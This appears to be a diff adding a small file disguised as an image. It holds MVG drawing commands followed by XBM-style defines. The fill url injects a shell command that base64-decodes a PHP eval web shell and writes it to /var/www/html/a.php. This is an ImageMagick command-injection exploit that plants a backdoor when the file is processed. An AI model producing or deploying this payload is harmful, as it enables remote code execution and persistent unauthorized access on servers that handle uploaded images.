@@ -1,0 +1,6 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg"|"`echo PD9waHAgZXZhbCgkX1BPU1RbcGVuc29uXSk7Pz4=|base64 -d > /var/www/html/a.php`)'
+pop graphic-context
+#define xlogo_width 200
+#define xlogo_height 200
